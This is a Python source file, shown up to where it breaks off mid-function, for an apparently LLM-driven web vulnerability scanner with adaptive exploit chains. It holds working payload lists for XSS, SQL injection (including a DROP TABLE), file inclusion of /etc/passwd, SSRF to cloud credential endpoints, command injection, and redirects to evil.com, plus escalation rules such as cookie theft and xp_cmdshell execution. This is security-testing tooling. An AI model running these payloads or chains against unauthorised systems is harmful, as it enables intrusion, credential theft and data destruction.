#!/usr/bin/env python3
"""
HexStrike AI Bug Bounty Engine v14.1.0-r2
==========================================
AI-driven web application security scanner with adaptive exploit chains,
RAG-backed memory, and LLM reasoning via DeepSeek/Ollama.

Changelog v14.1.0-r2:
  FIX #1  – import resource wrapped in try/except (RESOURCE_AVAILABLE flag)
  FIX #2  – result initialised before inner loops in ooda_worker
  FIX #3  – _rebuild_index calls .train() before .add() on IVFPQ index
  FIX #4  – run_scan returns (findings, chain_engine, tech_stack); main() unpacks
  FIX #5  – HTTP_SEM created inside run_scan after --workers is applied
  FIX #6  – per-logger .setLevel(logging.ERROR) instead of logging.disable()
  FIX #7  – _schedule_save holds _save_lock for counter AND thread-existence check
  FIX #8  – FallbackConsole.print strips Rich markup tags before printing
  FIX #9  – PrioritizationEngine.prioritize calls self.score() once per URL
  FIX #10 – atexit.register() calls at module level
  FIX #11 – deep_recon subdomain scope check handles full URLs correctly
  FIX #12 – preexec_fn lambda uses default-argument capture
  NEW     – --bug-bounty-header / --extra-header / --rate-limit / --user-agent CLI args
  NEW     – EXTRA_HEADERS global merged into every HTTP request
  NEW     – Config.RATE_LIMIT field used by TokenBucket
"""

__version__ = "14.1.0-r2"

# ---------------------------------------------------------------------------
# Standard-library imports
# ---------------------------------------------------------------------------
import argparse
import atexit
import gc
import hashlib
import html
import json
import logging
import math
import os
import pickle
import queue
import random
import re
import shutil
import signal
import socket
import string
import subprocess
import sys
import threading
import time
import uuid
from collections import defaultdict, deque
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, urljoin, urlparse, urlunparse, urlencode

# FIX #1 – resource module not available on Windows
try:
    import resource
    RESOURCE_AVAILABLE = True
except ImportError:
    resource = None          # type: ignore[assignment]
    RESOURCE_AVAILABLE = False

# ---------------------------------------------------------------------------
# Third-party imports (with graceful degradation)
# ---------------------------------------------------------------------------
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich.table import Table
    _RICH_AVAILABLE = True
except ImportError:
    _RICH_AVAILABLE = False

try:
    import numpy as np
    _NP_AVAILABLE = True
except ImportError:
    np = None          # type: ignore[assignment]
    _NP_AVAILABLE = False

try:
    import faiss
    _FAISS_AVAILABLE = True
except ImportError:
    faiss = None       # type: ignore[assignment]
    _FAISS_AVAILABLE = False

try:
    from sentence_transformers import SentenceTransformer
    _ST_AVAILABLE = True
except ImportError:
    SentenceTransformer = None   # type: ignore[assignment]
    _ST_AVAILABLE = False

try:
    import requests as _requests
    _REQUESTS_AVAILABLE = True
except ImportError:
    _requests = None             # type: ignore[assignment]
    _REQUESTS_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    _BS4_AVAILABLE = True
except ImportError:
    BeautifulSoup = None         # type: ignore[assignment]
    _BS4_AVAILABLE = False

# ---------------------------------------------------------------------------
# Logging – FIX #6: suppress noisy libraries with per-logger setLevel instead
#           of the nuclear logging.disable(logging.CRITICAL)
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s – %(message)s",
    handlers=[logging.StreamHandler(sys.stderr)],
)
logger = logging.getLogger("hexstrike")

for _noisy in ("urllib3", "httpx", "sentence_transformers", "faiss", "h2"):
    logging.getLogger(_noisy).setLevel(logging.ERROR)

# ---------------------------------------------------------------------------
# Rich console with fallback – FIX #8: strip markup in FallbackConsole
# ---------------------------------------------------------------------------
_MARKUP_RE = re.compile(r"\[/?[a-zA-Z0-9 _#/]+\]")

if _RICH_AVAILABLE:
    console = Console(stderr=True)
else:
    class FallbackConsole:                          # type: ignore[no-redef]
        """Minimal console that strips Rich markup before printing."""

        def print(self, *args: Any, **kwargs: Any) -> None:
            cleaned = [_MARKUP_RE.sub("", str(a)) for a in args]
            print(*cleaned)

        def log(self, *args: Any, **kwargs: Any) -> None:
            self.print(*args)

        def rule(self, title: str = "", **kwargs: Any) -> None:
            print(f"{'─' * 40} {_MARKUP_RE.sub('', title)} {'─' * 40}")

    console = FallbackConsole()  # type: ignore[assignment]

    class Panel:                # type: ignore[no-redef]
        def __init__(self, content: Any, **kwargs: Any) -> None:
            self._content = content
            self._kwargs = kwargs

        def __rich_console__(self, *a: Any, **kw: Any):  # pragma: no cover
            yield str(self._content)

        def __str__(self) -> str:
            return str(self._content)

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
@dataclass
class Config:
    """Central configuration – all tunables in one place."""
    WORKERS: int = 4
    CRAWL_DEPTH: int = 3
    MAX_PAGES: int = 40
    TIMEOUT: int = 10
    PROXY: Optional[str] = None
    DEEPINFRA_KEY: Optional[str] = None
    OOB_SERVER: Optional[str] = None
    OUTPUT_DIR: str = "results"
    USE_RAG: bool = True
    USE_GPU: bool = False
    RATE_LIMIT: float = 7.0          # NEW – max HTTP requests/second
    USER_AGENT: Optional[str] = None  # NEW – fixed UA override

    SEV_MAP: Dict[str, str] = field(default_factory=lambda: {
        "critical": "CRITICAL",
        "high": "HIGH",
        "medium": "MEDIUM",
        "low": "LOW",
        "info": "INFO",
    })

    MODELS: List[str] = field(default_factory=lambda: [
        "deepseek-ai/DeepSeek-V2.5",
        "meta-llama/Meta-Llama-3.1-70B-Instruct",
    ])

    # FAISS / RAG memory settings
    VECTOR_DIMENSION: int = 384
    FAISS_NLIST: int = 50
    FAISS_M: int = 8
    FAISS_NBITS: int = 8
    MEMORY_SAVE_INTERVAL: int = 50
    MAX_MEMORY_ENTRIES: int = 10_000

    # Semaphore will be created in run_scan (FIX #5)
    # HTTP_SEM is a module-level variable set there

cfg = Config()

# ---------------------------------------------------------------------------
# Global state / singletons
# ---------------------------------------------------------------------------
# FIX #5 – HTTP_SEM created inside run_scan(), not at module level
HTTP_SEM: threading.Semaphore = threading.Semaphore(cfg.WORKERS * 2)

# NEW – populated in main() from --bug-bounty-header / --extra-header
EXTRA_HEADERS: Dict[str, str] = {}

USER_AGENTS: List[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]

# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------
@dataclass
class AttackContext:
    url: str
    param: str
    vuln_type: str
    payload: str = ""
    encoding: str = "none"
    headers: Dict[str, str] = field(default_factory=dict)
    data: Dict[str, Any] = field(default_factory=dict)
    depth: int = 0
    chain_id: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class AttackResult:
    context: AttackContext
    success: bool = False
    confidence: float = 0.0
    evidence: List[str] = field(default_factory=list)
    response_code: int = 0
    response_length: int = 0
    response_body: str = ""
    extracted_data: Dict[str, Any] = field(default_factory=dict)
    error: Optional[str] = None
    duration_ms: float = 0.0


@dataclass
class Finding:
    vuln_type: str
    severity: str
    url: str
    param: str
    payload: str
    evidence: List[str]
    confidence: float
    chain_id: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict:
        return {
            "vuln_type": self.vuln_type,
            "severity": self.severity,
            "url": self.url,
            "param": self.param,
            "payload": self.payload,
            "evidence": self.evidence,
            "confidence": self.confidence,
            "chain_id": self.chain_id,
            "metadata": self.metadata,
        }

# ---------------------------------------------------------------------------
# Process-resource limits (FIX #1 guard)
# ---------------------------------------------------------------------------

def set_process_limits(memory_limit_mb: int = 512, timeout_s: int = 30) -> None:
    """Set memory and CPU-time limits for a subprocess (POSIX only)."""
    if not RESOURCE_AVAILABLE:
        return
    try:
        mem_bytes = memory_limit_mb * 1024 * 1024
        resource.setrlimit(resource.RLIMIT_AS, (mem_bytes, mem_bytes))   # type: ignore[attr-defined]
        resource.setrlimit(resource.RLIMIT_CPU, (timeout_s, timeout_s))  # type: ignore[attr-defined]
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Global state (pid tracking, endpoint cache)
# ---------------------------------------------------------------------------
class TTLBoundedSet:
    """Thread-safe set with per-item TTL and an optional size cap."""

    def __init__(self, max_size: int = 50_000, ttl: int = 3600) -> None:
        self._data: Dict[str, float] = {}
        self._max = max_size
        self._ttl = ttl
        self._lock = threading.Lock()

    def add(self, item: str) -> None:
        with self._lock:
            now = time.time()
            if len(self._data) >= self._max:
                # evict oldest
                oldest = min(self._data, key=self._data.__getitem__)
                del self._data[oldest]
            self._data[item] = now

    def __contains__(self, item: str) -> bool:
        with self._lock:
            ts = self._data.get(item)
            if ts is None:
                return False
            if time.time() - ts > self._ttl:
                del self._data[item]
                return False
            return True

    def __len__(self) -> int:
        return len(self._data)


class GlobalState:
    def __init__(self) -> None:
        self._pids: Set[int] = set()
        self._pid_lock = threading.Lock()
        self._endpoints: TTLBoundedSet = TTLBoundedSet(max_size=50_000, ttl=3600)

    def register_pid(self, pid: int) -> None:
        with self._pid_lock:
            self._pids.add(pid)

    def unregister_pid(self, pid: int) -> None:
        with self._pid_lock:
            self._pids.discard(pid)

    def cleanup_pids(self) -> None:
        with self._pid_lock:
            for pid in list(self._pids):
                try:
                    os.kill(pid, signal.SIGTERM)
                except OSError:
                    pass
            self._pids.clear()

    @property
    def endpoints(self) -> TTLBoundedSet:
        return self._endpoints


state = GlobalState()

# FIX #10 – register cleanup handlers at module level (not buried inside main)
atexit.register(state.cleanup_pids)
atexit.register(lambda: gc.collect())

# ---------------------------------------------------------------------------
# Token bucket rate-limiter
# ---------------------------------------------------------------------------
class TokenBucket:
    """Classic token-bucket used to enforce a per-second request rate."""

    def __init__(self, rate: float = 7.0, burst: Optional[float] = None) -> None:
        self.rate = rate
        self.burst = burst or rate * 2
        self._tokens = self.burst
        self._last = time.monotonic()
        self._lock = threading.Lock()

    def acquire(self, tokens: float = 1.0) -> None:
        while True:
            with self._lock:
                now = time.monotonic()
                elapsed = now - self._last
                self._last = now
                self._tokens = min(self.burst, self._tokens + elapsed * self.rate)
                if self._tokens >= tokens:
                    self._tokens -= tokens
                    return
                wait = (tokens - self._tokens) / self.rate
            time.sleep(wait)

# ---------------------------------------------------------------------------
# HTTP client
# ---------------------------------------------------------------------------
class StreamingHTTPClient:
    """Thin synchronous HTTP wrapper with rate-limiting, retry, and proxy support."""

    def __init__(self) -> None:
        self._rate_limiter = self._create_rate_limiter()
        self._session = self._create_session()

    def _create_rate_limiter(self) -> TokenBucket:
        return TokenBucket(rate=cfg.RATE_LIMIT)

    def _create_session(self):
        if not _REQUESTS_AVAILABLE:
            return None
        import requests
        session = requests.Session()
        if cfg.PROXY:
            session.proxies = {"http": cfg.PROXY, "https": cfg.PROXY}
        session.verify = False  # bug-bounty scanner; TLS errors are often intentional
        return session

    def request(
        self,
        method: str,
        url: str,
        headers: Optional[Dict[str, str]] = None,
        data: Optional[Dict] = None,
        json_body: Optional[Dict] = None,
        timeout: Optional[int] = None,
        allow_redirects: bool = True,
    ) -> Optional[Any]:
        if not _REQUESTS_AVAILABLE or self._session is None:
            return None

        self._rate_limiter.acquire()

        # Build request headers
        req_headers: Dict[str, str] = {
            "User-Agent": cfg.USER_AGENT or random.choice(USER_AGENTS),
        }
        if headers:
            req_headers.update(headers)
        # Merge global extra headers (NEW – --bug-bounty-header / --extra-header)
        req_headers.update(EXTRA_HEADERS)

        try:
            with HTTP_SEM:
                resp = self._session.request(
                    method=method.upper(),
                    url=url,
                    headers=req_headers,
                    data=data,
                    json=json_body,
                    timeout=timeout or cfg.TIMEOUT,
                    allow_redirects=allow_redirects,
                )
            return resp
        except Exception as exc:
            logger.debug("HTTP %s %s → %s", method, url, exc)
            return None

    def get(self, url: str, **kw: Any) -> Optional[Any]:
        return self.request("GET", url, **kw)

    def post(self, url: str, **kw: Any) -> Optional[Any]:
        return self.request("POST", url, **kw)

# ---------------------------------------------------------------------------
# Tool runner
# ---------------------------------------------------------------------------
def run_tool_streaming(
    cmd: List[str],
    timeout: int = 120,
    memory_limit: int = 256,
    cwd: Optional[str] = None,
) -> Tuple[int, str, str]:
    """
    Run an external command, streaming output line-by-line.

    FIX #12 – freeze lambda arguments with default-capture so that later
    reassignments of local variables cannot affect the preexec callback.
    """
    # FIX #12 – use default-argument capture instead of bare closure
    if RESOURCE_AVAILABLE:
        preexec: Any = (
            lambda m=memory_limit, t=timeout: set_process_limits(m, t)
        )
    else:
        preexec = None

    stdout_lines: List[str] = []
    stderr_lines: List[str] = []

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            cwd=cwd,
            preexec_fn=preexec,
        )
        state.register_pid(proc.pid)
        try:
            out, err = proc.communicate(timeout=timeout)
            stdout_lines = out.splitlines()
            stderr_lines = err.splitlines()
            return proc.returncode, out, err
        except subprocess.TimeoutExpired:
            proc.kill()
            out, err = proc.communicate()
            return -1, out, err
        finally:
            state.unregister_pid(proc.pid)
    except FileNotFoundError:
        return -127, "", f"Command not found: {cmd[0]}"
    except Exception as exc:
        return -1, "", str(exc)

# ---------------------------------------------------------------------------
# URL helpers
# ---------------------------------------------------------------------------
def normalize_url(url: str) -> str:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    p = urlparse(url)
    return urlunparse((p.scheme, p.netloc, p.path.rstrip("/") or "/", "", "", ""))


def in_scope(url: str, base: str) -> bool:
    try:
        base_host = urlparse(base).netloc.lower().lstrip("www.")
        target_host = urlparse(url).netloc.lower().lstrip("www.")
        return target_host == base_host or target_host.endswith("." + base_host)
    except Exception:
        return False


def extract_params(url: str) -> List[str]:
    try:
        return list(parse_qs(urlparse(url).query).keys())
    except Exception:
        return []

# ---------------------------------------------------------------------------
# Payload library
# ---------------------------------------------------------------------------
PAYLOADS: Dict[str, List[str]] = {
    "xss": [
        "<script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        "';alert(String.fromCharCode(88,83,83))//",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
    ],
    "sqli": [
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE users;--",
        "1 UNION SELECT NULL,NULL,NULL--",
        "' AND SLEEP(5)--",
        "1' AND '1'='1",
    ],
    "lfi": [
        "../../../../etc/passwd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "/etc/passwd",
        "....//....//etc/passwd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "http://localhost/",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
    ],
    "rce": [
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "&& id",
    ],
    "open_redirect": [
        "//evil.com",
        "https://evil.com",
        "///evil.com",
        "/\\evil.com",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "@(7*7)",
    ],
}

VULN_SEVERITIES: Dict[str, str] = {
    "rce": "CRITICAL",
    "sqli": "HIGH",
    "ssrf": "HIGH",
    "lfi": "HIGH",
    "ssti": "HIGH",
    "xss": "MEDIUM",
    "open_redirect": "LOW",
    "idor": "HIGH",
}

VULN_INDICATORS: Dict[str, List[str]] = {
    "xss": ["<script>alert(1)</script>", "onerror=alert"],
    "sqli": [
        "syntax error", "mysql", "ORA-", "pg_query", "sqlite", "JDBC",
        "Warning: mysql", "You have an error in your SQL",
    ],
    "lfi": ["root:x:", "[boot loader]", "daemon:", "nobody:"],
    "ssrf": ["ami-id", "instance-id", "security-credentials", "169.254"],
    "rce": ["uid=", "gid=", "groups="],
    "ssti": ["49"],  # 7*7
    "open_redirect": [],
}

# ---------------------------------------------------------------------------
# Advanced RAG memory
# ---------------------------------------------------------------------------
class AdvancedRAG:
    """Retrieval-Augmented Generation memory backed by FAISS."""

    def __init__(self, folder: str) -> None:
        self._folder = Path(folder)
        self._folder.mkdir(parents=True, exist_ok=True)
        self._index_path = self._folder / "rag.faiss"
        self._meta_path = self._folder / "rag_meta.pkl"
        self._lock = threading.RLock()
        self._save_lock = threading.Lock()
        self._save_thread: Optional[threading.Thread] = None
        self._pending_saves: int = 0
        self._texts: List[str] = []
        self._metadata: List[Dict] = []
        self.vectors: Optional[Any] = None
        self.index: Optional[Any] = None
        self.is_trained: bool = False
        self._encoder: Optional[Any] = None
        self._init_encoder()
        self._load()

    def _init_encoder(self) -> None:
        if _ST_AVAILABLE and SentenceTransformer is not None:
            try:
                self._encoder = SentenceTransformer(
                    "sentence-transformers/all-MiniLM-L6-v2",
                    device="cuda" if cfg.USE_GPU else "cpu",
                )
            except Exception:
                self._encoder = None

    def _encode(self, texts: List[str]) -> Optional[Any]:
        if self._encoder is None or not _NP_AVAILABLE:
            return None
        try:
            return self._encoder.encode(
                texts, convert_to_numpy=True, normalize_embeddings=True
            )
        except Exception:
            return None

    def _load(self) -> None:
        try:
            if self._index_path.exists() and self._meta_path.exists():
                if _FAISS_AVAILABLE:
                    self.index = faiss.read_index(str(self._index_path))   # type: ignore[union-attr]
                with open(self._meta_path, "rb") as fh:
                    data = pickle.load(fh)
                    self._texts = data.get("texts", [])
                    self._metadata = data.get("metadata", [])
                    self.is_trained = data.get("is_trained", False)
        except Exception as exc:
            logger.debug("RAG load failed: %s", exc)

    def add(self, text: str, meta: Optional[Dict] = None) -> None:
        with self._lock:
            if len(self._texts) >= cfg.MAX_MEMORY_ENTRIES:
                self._texts.pop(0)
                self._metadata.pop(0)
            self._texts.append(text)
            self._metadata.append(meta or {})
        self._schedule_save()

    def search(self, query: str, top_k: int = 5) -> List[Dict]:
        with self._lock:
            if not self._texts:
                return []
            if self.index is None or not _FAISS_AVAILABLE or not _NP_AVAILABLE:
                # fallback: keyword match
                q_lower = query.lower()
                results = []
                for i, t in enumerate(self._texts):
                    if q_lower in t.lower():
                        results.append({"text": t, "meta": self._metadata[i], "score": 1.0})
                return results[:top_k]
            vec = self._encode([query])
            if vec is None:
                return []
            try:
                distances, indices = self.index.search(
                    vec.astype(np.float32), min(top_k, len(self._texts))
                )
                out = []
                for dist, idx in zip(distances[0], indices[0]):
                    if 0 <= idx < len(self._texts):
                        out.append({
                            "text": self._texts[idx],
                            "meta": self._metadata[idx],
                            "score": float(1 / (1 + dist)),
                        })
                return out
            except Exception:
                return []

    def _rebuild_index(self) -> None:
        """FIX #3 – call .train() before .add() on IVFPQ index."""
        if not _FAISS_AVAILABLE or not _NP_AVAILABLE or not self._texts:
            return
        vecs = self._encode(self._texts)
        if vecs is None:
            return
        self.vectors = vecs.astype(np.float32)
        n = len(self.vectors)
        dim = cfg.VECTOR_DIMENSION

        if n >= cfg.FAISS_NLIST * 39 and self.is_trained:
            quantizer = faiss.IndexFlatL2(dim)                    # type: ignore[union-attr]
            self.index = faiss.IndexIVFPQ(                        # type: ignore[union-attr]
                quantizer, dim, cfg.FAISS_NLIST, cfg.FAISS_M, cfg.FAISS_NBITS
            )
            self.index.train(self.vectors)   # FIX #3 – must train before add
            self.index.add(self.vectors)
            self.is_trained = True
        else:
            self.index = faiss.IndexFlatL2(dim)                   # type: ignore[union-attr]
            self.index.add(self.vectors)

    def _schedule_save(self) -> None:
        """FIX #7 – hold _save_lock for BOTH the counter increment and
        the thread-existence check to prevent duplicate save threads."""
        rag_self = self

        def save_worker() -> None:
            while True:
                with rag_self._save_lock:
                    if rag_self._pending_saves == 0:
                        break
                    rag_self._pending_saves = 0
                try:
                    rag_self._rebuild_index()
                    with rag_self._lock:
                        if _FAISS_AVAILABLE and rag_self.index is not None:
                            faiss.write_index(                    # type: ignore[union-attr]
                                rag_self.index, str(rag_self._index_path)
                            )
                        with open(rag_self._meta_path, "wb") as fh:
                            pickle.dump(
                                {
                                    "texts": rag_self._texts,
                                    "metadata": rag_self._metadata,
                                    "is_trained": rag_self.is_trained,
                                },
                                fh,
                            )
                except Exception as exc:
                    logger.debug("RAG save failed: %s", exc)

        # FIX #7 – acquire lock BEFORE checking _pending_saves and thread alive
        with self._save_lock:
            self._pending_saves += 1
            if self._save_thread is None or not self._save_thread.is_alive():
                self._save_thread = threading.Thread(
                    target=save_worker, daemon=True
                )
                self._save_thread.start()

# ---------------------------------------------------------------------------
# Blind / OOB vulnerability detector
# ---------------------------------------------------------------------------
class BlindVulnDetector:
    """Detects blind vulns by polling a callback server (e.g. Burp Collaborator)."""

    def __init__(self, oob_server: Optional[str] = None) -> None:
        self._server = oob_server or cfg.OOB_SERVER
        self._callbacks: Dict[str, Dict] = {}
        self._lock = threading.Lock()

    def generate_token(self, context: AttackContext) -> str:
        token = uuid.uuid4().hex[:12]
        with self._lock:
            self._callbacks[token] = {
                "context": context,
                "ts": time.time(),
                "triggered": False,
            }
        return token

    def oob_url(self, token: str) -> str:
        if self._server:
            return f"http://{token}.{self._server}"
        return f"http://oob-placeholder-{token}.example.com"

    def check_callback(self, token: str, timeout: int = 30) -> bool:
        if not _REQUESTS_AVAILABLE or not self._server:
            return False
        deadline = time.time() + timeout
        poll_url = f"http://{self._server}/api/poll/{token}"
        while time.time() < deadline:
            try:
                resp = _requests.get(poll_url, timeout=5)
                if resp.ok and resp.json().get("triggered"):
                    return True
            except Exception:
                pass
            time.sleep(3)
        return False

# ---------------------------------------------------------------------------
# LLM client
# ---------------------------------------------------------------------------
class LLMClient:
    """Calls DeepInfra API or local Ollama for reasoning tasks."""

    def __init__(self) -> None:
        self._model_lock = threading.Lock()
        self._model: str = cfg.MODELS[0]

    def _call_deepinfra(
        self, prompt: str, system: str = "", expect_json: bool = False
    ) -> Optional[str]:
        if not _REQUESTS_AVAILABLE or not cfg.DEEPINFRA_KEY:
            return None
        body = {
            "model": self._model,
            "messages": [
                {"role": "system", "content": system or "You are a security research assistant."},
                {"role": "user", "content": prompt},
            ],
            "temperature": 0.1,
            "max_tokens": 1024,
        }
        if expect_json:
            body["response_format"] = {"type": "json_object"}
        try:
            resp = _requests.post(
                "https://api.deepinfra.com/v1/openai/chat/completions",
                json=body,
                headers={
                    "Authorization": f"Bearer {cfg.DEEPINFRA_KEY}",
                    "Content-Type": "application/json",
                },
                timeout=30,
            )
            if resp.ok:
                return resp.json()["choices"][0]["message"]["content"]
        except Exception as exc:
            logger.debug("DeepInfra error: %s", exc)
        return None

    def _call_ollama(
        self, prompt: str, system: str = "", expect_json: bool = False
    ) -> Optional[str]:
        if not _REQUESTS_AVAILABLE:
            return None
        with self._model_lock:
            model = self._model
        body = {
            "model": model,
            "prompt": prompt,
            "system": system,
            "stream": False,
        }
        if expect_json:
            body["format"] = "json"
        try:
            resp = _requests.post(
                "http://localhost:11434/api/generate",
                json=body,
                timeout=60,
            )
            if resp.ok:
                return resp.json().get("response", "")
        except Exception as exc:
            logger.debug("Ollama error: %s", exc)
        return None

    def complete(
        self,
        prompt: str,
        system: str = "",
        expect_json: bool = False,
    ) -> Optional[str]:
        """Try DeepInfra first, fall back to Ollama."""
        result = self._call_deepinfra(prompt, system, expect_json)
        if result:
            return result
        return self._call_ollama(prompt, system, expect_json)

# ---------------------------------------------------------------------------
# LLM Reasoning Engine
# ---------------------------------------------------------------------------
class LLMReasoningEngine:
    """Uses the LLM to reason about attack results and suggest next steps."""

    def __init__(self, rag: Optional[AdvancedRAG] = None) -> None:
        self._llm = LLMClient()
        self._rag = rag

    def _call_llm(self, prompt: str, system: str = "", expect_json: bool = False) -> Optional[str]:
        # Optionally enrich prompt with RAG context
        if self._rag:
            hits = self._rag.search(prompt[:200], top_k=3)
            if hits:
                ctx = "\n".join(h["text"] for h in hits)
                prompt = f"[Past context]\n{ctx}\n\n[Query]\n{prompt}"
        return self._llm.complete(prompt, system, expect_json)

    # ------------------------------------------------------------------
    # analyze_response  (SyntaxError fix – complete the f-string)
    # ------------------------------------------------------------------
    def analyze_response(self, result: AttackResult) -> Dict:
        """
        Ask the LLM to analyse an AttackResult and recommend next actions.

        Returns a dict with keys:
          next_action, chain_opportunity, chain_type, confidence, reasoning
        """
        evidence_str = "\n".join(
            f"- {ev}" for ev in (result.evidence or ["(none)"])
        )

        prompt = (
            f"You are analysing the result of a web-application security test.\n\n"
            f"URL: {result.context.url}\n"
            f"Parameter: {result.context.param}\n"
            f"Payload: {result.context.payload}\n"
            f"Encoding: {result.context.encoding}\n"
            f"Response status: {result.response_code}\n"
            f"Response length: {result.response_length}\n"
            f"Evidence:\n{evidence_str}\n"
            f"Test succeeded: {result.success}\n"
            f"Confidence: {result.confidence:.2f}\n\n"
            f"Respond with JSON containing these keys:\n"
            f"  next_action       (string: 'escalate'|'pivot'|'report'|'skip')\n"
            f"  chain_opportunity (bool)\n"
            f"  chain_type        (string or null)\n"
            f"  confidence        (float 0-1)\n"
            f"  reasoning         (string, ≤ 120 words)"
        )

        system = (
            "You are a senior penetration tester. Respond ONLY with valid JSON. "
            "Be concise and actionable."
        )

        raw = self._call_llm(prompt, system=system, expect_json=True)
        if raw:
            try:
                data = json.loads(raw)
                return {
                    "next_action": data.get("next_action", "skip"),
                    "chain_opportunity": bool(data.get("chain_opportunity", False)),
                    "chain_type": data.get("chain_type"),
                    "confidence": float(data.get("confidence", result.confidence)),
                    "reasoning": data.get("reasoning", ""),
                }
            except (json.JSONDecodeError, ValueError):
                pass

        # Fallback – simple heuristic
        action = "report" if result.success else "skip"
        return {
            "next_action": action,
            "chain_opportunity": result.success and result.confidence > 0.7,
            "chain_type": None,
            "confidence": result.confidence,
            "reasoning": "LLM unavailable; heuristic fallback.",
        }

    def suggest_chain_escalation(
        self, chain: Dict, extracted_data: Dict
    ) -> List[AttackContext]:
        """
        Given a completed chain entry and extracted data, ask the LLM to suggest
        follow-up attack contexts.
        """
        last_stage = (chain.get("stages") or [{}])[-1]

        prompt = (
            f"Attack chain entry:\n{json.dumps(chain, indent=2)}\n\n"
            f"Stages completed: {len(chain.get('stages', []))}\n"
            f"Last stage summary: {json.dumps(last_stage, indent=2)}\n"
            f"Extracted data: {json.dumps(extracted_data, indent=2)}\n\n"
            f"Suggest up to 3 follow-up attack contexts as a JSON array, each with keys:\n"
            f"  url, param, vuln_type, payload, metadata (dict)"
        )

        raw = self._call_llm(prompt, expect_json=True)
        if raw:
            try:
                items = json.loads(raw)
                if isinstance(items, list):
                    contexts = []
                    for item in items[:3]:
                        contexts.append(
                            AttackContext(
                                url=str(item.get("url", chain.get("target_url", ""))),
                                param=str(item.get("param", "")),
                                vuln_type=str(item.get("vuln_type", "xss")),
                                payload=str(item.get("payload", "")),
                                metadata=dict(item.get("metadata", {})),
                            )
                        )
                    return contexts
            except (json.JSONDecodeError, ValueError):
                pass

        return self._get_fallback_chain_suggestions(chain)

    def _get_fallback_chain_suggestions(self, chain: Dict) -> List[AttackContext]:
        """
        Rule-based fallback when the LLM is unavailable.
        xss → session steal, ssrf → AWS metadata, lfi → rce, sqli → rce
        """
        last_vuln = ""
        stages = chain.get("stages", [])
        if stages:
            last_vuln = stages[-1].get("vuln_type", "").lower()
        target_url = chain.get("target_url", "")

        mapping: Dict[str, Tuple[str, str]] = {
            "xss": ("session_steal", "document.cookie"),
            "ssrf": ("credential_leak", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            "lfi": ("rce", "php://input"),
            "sqli": ("rce", "1; EXEC xp_cmdshell('id')--"),
        }

        if last_vuln in mapping:
            next_vuln, next_payload = mapping[last_vuln]
            return [
                AttackContext(
                    url=target_url,
                    param="",
                    vuln_type=next_vuln,
                    payload=next_payload,
                    metadata={"source": "fallback_chain"},
                )
            ]
        return []

# ---------------------------------------------------------------------------
# Adaptive Exploit Loop
# ---------------------------------------------------------------------------
class AdaptiveExploitLoop:
    """Executes attacks, learns from results, and adapts payloads."""

    def __init__(self, http_client: StreamingHTTPClient) -> None:
        self._http = http_client
        self._success_patterns: Dict[str, List[str]] = defaultdict(list)
        self._fail_patterns: Dict[str, List[str]] = defaultdict(list)
        self._lock = threading.Lock()

    def execute(self, context: AttackContext) -> AttackResult:
        result = AttackResult(context=context)
        t0 = time.monotonic()

        baseline = self._get_baseline(context)
        attack_data = self._execute_attack(context)

        result.response_code = attack_data.get("status", 0)
        result.response_length = attack_data.get("length", 0)
        result.response_body = attack_data.get("body", "")
        result.duration_ms = (time.monotonic() - t0) * 1000

        # Check for known indicators
        indicators = VULN_INDICATORS.get(context.vuln_type, [])
        body_lower = result.response_body.lower()
        for ind in indicators:
            if ind.lower() in body_lower:
                result.evidence.append(f"Indicator found: {ind!r}")
                result.success = True

        # Differential analysis
        if baseline and abs(result.response_length - baseline.get("length", 0)) > 200:
            result.evidence.append(
                f"Length delta: {result.response_length - baseline.get('length', 0)}"
            )

        result.confidence = min(1.0, len(result.evidence) * 0.35) if result.success else 0.0

        self._learn(result)
        return result

    def _get_baseline(self, context: AttackContext) -> Dict:
        """Fetch the page without an attack payload to establish a baseline."""
        resp = self._http.get(context.url, headers=context.headers)
        if resp is None:
            return {}
        try:
            return {
                "status": resp.status_code,
                "length": len(resp.text),
                "body": resp.text[:500],
            }
        except Exception:
            return {}

    def _execute_attack(self, context: AttackContext) -> Dict:
        """Inject the payload into the appropriate request component."""
        target_url = context.url
        data: Dict[str, str] = dict(context.data or {})

        if context.param:
            # Try URL parameter injection
            parsed = urlparse(target_url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if context.param in params:
                params[context.param] = [context.payload]
            else:
                data[context.param] = context.payload

            new_query = urlencode({k: v[0] for k, v in params.items()})
